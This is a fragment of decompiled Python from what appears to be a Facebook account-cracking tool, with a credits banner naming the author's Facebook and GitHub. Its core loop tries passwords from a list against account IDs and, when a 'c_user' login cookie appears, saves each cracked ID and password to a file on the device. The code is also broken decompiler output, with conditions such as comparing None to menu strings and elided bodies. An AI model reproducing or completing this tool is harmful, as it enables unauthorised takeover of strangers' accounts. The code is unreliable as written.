...
def o():
    ...
    if None == '2':
        ...
        return None
    if None == '3':
        os.system('xdg-open https://github.com/H6X-SHANTO/shanto.py')
        return None
    if None == '4':
        os.system('xdg-open https://www.facebook.com/djj.shanto.6')
        return None
...
\033[1;95m[\033[1;93m✔︎\033[1;95m]\033[1;93m FACEBOOK\033[1;91m : \033[1;95mS　H　A　N　T　O　ツ
\033[1;95m[\033[1;93m✔︎\033[1;95m]\033[1;93m GITHUB  \033[1;91m : \033[1;95mH6X-SHANTO
\033[1;95m[\033[1;93m✔︎\033[1;95m]\033[1;93m TOOLS   \033[1;91m : \033[1;95mRANDOM FREE
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/JIHAD-505-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
